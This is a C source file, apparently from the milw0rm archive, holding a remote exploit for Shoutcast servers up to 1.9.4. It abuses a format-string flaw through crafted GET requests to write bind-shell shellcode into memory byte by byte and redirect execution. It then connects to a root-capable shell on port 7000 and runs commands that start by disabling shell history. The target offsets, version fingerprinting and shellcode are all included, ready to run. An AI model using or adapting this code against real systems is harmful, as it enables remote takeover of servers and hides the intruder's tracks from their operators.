/* 
 * Shoutcast <= 1.9.4 exploit by crash-x
 * Trys to upload the shellcode to a fixed address
 * and execute it. 
 *
 * This exploit was _not_ written bei Simon 'Zodiac' Moser (segfault.ch).
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <stdarg.h>
#include <signal.h>    

#define SHELL_PORT 7000
#define SHELL_COMMAND "unset HISTFILE; uname -a; id;"


#if 1
unsigned char shellcode[] = /* bindshell (7000) (Unknown) */
               "\x31\xc0\x50\x50\x66\xc7\x44\x24\x02\x1b\x58\xc6\x04\x24\x02\x89\xe6"
               "\xb0\x02\xcd\x80\x85\xc0\x74\x08\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x50"
               "\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb0\x66\xb3\x01\xcd\x80\x89\xc5\x6a"
               "\x10\x56\x50\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x6a\x01\x55\x89\xe1\x31"
               "\xc0\x31\xdb\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x50\x50\x55\x89\xe1\xb0"
               "\x66\xb3\x05\xcd\x80\x89\xc5\x31\xc0\x89\xeb\x31\xc9\xb0\x3f\xcd\x80"
               "\x41\x80\xf9\x03\x7c\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
               "\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"; 
#endif


struct targ{
    char *platform;
    int retloc; 
    int retaddr;
    int dpa_offset;

} targets[]= {
    { "Try to determine target", 0xdeadbabe, 0xdeadbabe, 123 }, 
    { "Shoutcast 1.9.4 all Linux distros", 0x0806493c, 0xdeadbabe, 2534 }, // dpa offset stolen from coki and tal0n's exploit
    { "Shoutcast 1.9.2 all Linux distros", 0x0806c270, 0xdeadbabe, 2536 },
    { NULL }
};


void usage(char *a){
    int i;

    printf("[-] Usage: %s -h <host> [options]\n", a);
    printf("[!] Options:\n");
    printf("\t\t-h\tHostname you want attack (required)\n");
    printf("\t\t-p\tPort of the shoutcast (default: 8000)\n");
    printf("\t\t-t\tTarget (default: 0)\n");
    printf("\t\t-s\tHow long to sleep before try connect to shell in s (default: 1)\n");
    printf("\t\t-S\tHow long to sleep before write the next byte of shellcode to the memory in ms (default: 7)\n"); 
    printf("[!] Targets:\n");
    for(i = 0; targets[i].platform; i++)
        printf("\t\t%d\t %s\n", i, targets[i].platform);
    exit(1);
}
    

int sockprintf(int sock, const char *s, ...){
    char *ptr;
    int bytes;
    va_list arg;
    va_start(arg, s);
    if(vasprintf(&ptr, s, arg) == -1){
/*        free(ptr); do'h shame on me */
        return -1;
    }
    va_end(arg);

    bytes = send(sock, ptr, strlen(ptr), 0);
    free(ptr);
    return bytes;
}


int resolv(struct sockaddr_in *addr, char *hostn){
	struct hostent *host;

    if (!inet_aton(hostn, &addr->sin_addr)){
        host = gethostbyname(hostn);
        if (host == NULL){
            printf("[-] Wasnt able to resolve %s!\n", hostn);
            return -1;
        }
        addr->sin_addr = *(struct in_addr*)host->h_addr;
    }
    return 0;
}


int conn(struct sockaddr_in addr, int port){
    int sock;
    
    if((sock = socket(PF_INET, SOCK_STREAM, 0)) == -1){
        return -1;
    }

    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == -1){
        return -1;
	}
    return sock;
}


int get_shell(struct sockaddr_in addr, int port, int sleeps){
    int sock;
    char buffer[1024];
    fd_set fds;
        
    signal(SIGINT, SIG_IGN);

    sleep(sleeps);

    if((sock = conn(addr, port)) == -1)
        return (-1);
    printf("[+] Wooohooo we got a shell!\n");
    sockprintf(sock, SHELL_COMMAND"\r\n");
    while(1){
        FD_ZERO(&fds);
        FD_SET(0, &fds);
        FD_SET(sock, &fds);

        if (select(255, &fds, NULL, NULL, NULL) == -1){
            fprintf(stderr,"[-] sending failed\n");
            close(sock);
            exit(1);
        }

        memset(buffer, 0x0, sizeof(buffer));
        if (FD_ISSET(sock, &fds)){
            if (recv(sock, buffer, sizeof(buffer), 0) == -1){
                fprintf(stderr, "[-] Connection closed by remote host!\n");
                close(sock);
                exit(1);
            }
            fprintf(stderr, "%s", buffer);
        }

        if (FD_ISSET(0, &fds)){
            read(0, buffer, sizeof(buffer));
            write(sock, buffer, strlen(buffer));
        }
    }
    return 0;
}


void status(int i, int retloc){
    static int c=1;

    switch(c){
        case 1:
            printf("[|] ");
            break;
        case 2:
            printf("[/] ");
            break;
        case 3:
            printf("[-] ");
            break;
        case 4:
            printf("[\\] ");
            c = 0;
            break;
    }
    printf("Uploading shellcode[%d] to [%p]\r", i, (void *)retloc);
    fflush(stdout);
    c++;
}


int write_shellcode(struct sockaddr_in addr, int port, int target, int wsleeps){
    char buffer[1024];
    int retloc = ((0xc0000000) - 8 - strlen(shellcode)), i = 0, sock;

    targets[target].retaddr = retloc;

    for(i = 0; i < strlen(shellcode); i++, retloc++){
        if((sock = conn(addr, port)) == -1)
            return -1;

        status(i, retloc);

        *((void **)(buffer)) = (void *)((retloc));
        buffer[4] = 0x0;
        sockprintf(sock, "GET /content/DD%s.mp3 HTTP/1.1\r\n\r\n", buffer);

        close(sock);

        if(shellcode[i] > 9)
            snprintf(buffer, sizeof(buffer), "%%.%du%%%d$hn", shellcode[i], targets[target].dpa_offset);
        else {
            memset(buffer, 0x41, shellcode[i]);
            snprintf(buffer + shellcode[i], sizeof(buffer), "%%%d$hn", targets[target].dpa_offset);
        }

        if((sock = conn(addr, port)) == -1)
            return -1;

        sockprintf(sock, "GET /content/%s.mp3 HTTP/1.1\r\n\r\n", buffer);
        close(sock);
//        sleep(1);
        usleep(wsleeps * 100000);
    }
    return 0;

}


int get_target(struct sockaddr_in addr, int port){
    char buffer[1024], *ptr, *ptr2;
    int sock, bytes;

    if((sock = conn(addr, port)) == -1){
        printf("failed!\r[-]\n"); 
        return -2;
    }     
    printf("done!\n");

    sockprintf(sock, "GET /doesntmatter HTTP/1.1\r\n\r\n");
    
    if((bytes = recv(sock, buffer, sizeof(buffer)-1, 0)) == -1){
        printf("[-] Wasnt able to determine version of server, do it yourself!\n");
        return -1;
    }
    buffer[bytes] = 0x0;

    if(!(ptr = strstr(buffer, "<BR>"))){
        printf("[-] Wasnt able to determine version of server, do it yourself!\n");    
        return -1;
    }
    ptr += 4;
    if(!(ptr2 = strstr(ptr, "<BR>"))){
        printf("[-] Wasnt able to determine version of server, do it yourself!\n");    
        return -1;
    }
    *ptr2 = 0x0;

    printf("[!] Version: %s\n", ptr);

    if(strstr(ptr, "Server/Linux v1.9.4"))
        return 1;
    else if(strstr(ptr, "Server/Linux v1.9.2"))
        return 2;
    else if(strstr(ptr, "Server/FreeBSD")){   
        printf("[-] The server runs on FreeBSD, it could be FBSD 4.x or 5.x choose the target yourself!\n");
        return -1;
    } else {
        printf("[-] Wasnt able to find target for this server!\n");
        return -1;
    }

    return -1;
}


int main(int argc, char **argv){
    char *hostn = NULL, buffer[1024];
    int i, sock, opt, target = 0, port = 8000, shell_port = SHELL_PORT, sleeps = 1, wsleeps = 7;
    unsigned short ret1, ret2;
	struct sockaddr_in addr;

    printf("[!] Shoutcast <= 1.9.4 exploit by crash-x\n");
  
    if (argc < 2)
        usage(argv[0]);
    
    while ((opt = getopt (argc, argv, "h:p:t:s:S:")) != -1){
        switch (opt){
	        case 'h':
	            hostn = optarg;
	            break;
	        case 'p':
                port = atoi(optarg);
                if(port > 65535 || port < 1){
                    printf("[-] Port %d is invalid\n",port);
                    return 1;
                }
                break;
            case 't':
                target = atoi(optarg);
                for(i = 0; targets[i].platform; i++);
                if(target >= i){
                    printf("[-] Wtf are you trying to target?\n");
                    usage(argv[0]);
                }
                break;
            case 's': 
                sleeps = atoi(optarg);
                break;
            case 'S': 
                wsleeps = atoi(optarg);
                break;
        	default:
                usage(argv[0]);
        }
    }

    if(hostn == NULL)
        usage(argv[0]);

    resolv(&addr, hostn);

    printf("[!] Connecting to target... ");
    fflush(stdout);
    if(target == 0){
        if((target = get_target(addr, port)) < 0)
            return target;
    } else 
        if(get_target(addr, port) == -2)
            exit(-2);

    printf("[!] Targeting: %s\n", targets[target].platform);
    

    if(write_shellcode(addr, port, target, wsleeps) != -1)
        printf("[+]\n[+] Uploaded shellcode succesful\n");
    else {
        printf("[-]\n[-] Wasn't able to upload shellcode, server probably crashed!\n");
        return -1;
    }

    printf("[!] Writing retaddr [%p] to retloc [%p]\n", (void *)targets[target].retaddr, (void *)targets[target].retloc);


    if((sock = conn(addr, port)) == -1){
        printf("[-] Connecting failed!\n");
        return -1;
    }
    memset(buffer, 0x0, sizeof(buffer));
    *((void **)(buffer)) = (void *)(targets[target].retloc);
    *((void **)(buffer + 4)) = (void *)(targets[target].retloc + 2);
    sockprintf(sock, "GET /content/DD%s.mp3 HTTP/1.1\r\n\r\n", buffer);
    close(sock);

    ret1 = (targets[target].retaddr & 0xffff0000) >> 16;
    ret2 = (targets[target].retaddr & 0x0000ffff);

    snprintf(buffer, sizeof(buffer), "%%.%uu%%%d$hn%%.%uu%%%d$hn", 
            ret1, targets[target].dpa_offset + 1, (ret2 - ret1), targets[target].dpa_offset);

    if((sock = conn(addr, port)) == -1){
        printf("[-] Connecting failed!\n");
        return -1;
    }
    sockprintf(sock, "GET /content/%s.mp3 HTTP/1.1\r\n\r\n", buffer);

    if(get_shell(addr, shell_port, sleeps) == -1){
        printf("[-] Exploit failed\n");
        return -1;
    }
    return 1;
}

// milw0rm.com [2006-01-28]
